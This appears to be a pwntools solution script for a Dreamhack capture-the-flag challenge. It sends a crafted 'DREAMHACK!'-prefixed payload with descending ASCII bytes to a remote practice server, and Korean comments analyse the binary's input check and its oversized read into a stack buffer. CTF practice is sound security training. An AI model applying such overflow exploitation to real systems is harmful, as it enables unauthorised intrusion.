#!/usr/bin/python3

import pwn

pwn.context.log_level = 'debug'
p = pwn.remote("host1.dreamhack.games", 9041)

idx = 126
postfix = ""
secret = "DREAMHACK!"

for i in range(78):
    postfix += chr(idx)
    idx -= 0x1

payload = secret
payload += postfix

p.sendline(payload)
p.interactive()

"""
validate_dist와 validate_server로 이루어져 있음

validate_dist에서는 read 함수를 통해 최대 0x400 크기만큼 입력받음
이를 $rbp-0x80에 저장함.

그 후 입력받은 값을 인자로 validate 함수를 호출함

validate 함수 내에서 입력값의 주소를 $rbp-0x18로 이동

첫 번째 과정을 통해 0x9 크기만큼 "DREAMHACK!" 문자를 입력하였는지 검증

1차 검증이 끝난 후에 문자열 주소+0xb 부터 0xb에서 시작한 게 0x80보다 커질 때 까지 반복한다.
이때 현재 위치와 현재 위치 +1 문자를 비교하는데 현재 위치의 문자가 현재 위치 문자보다 ASCII 값이 1 작아야한다.
"""
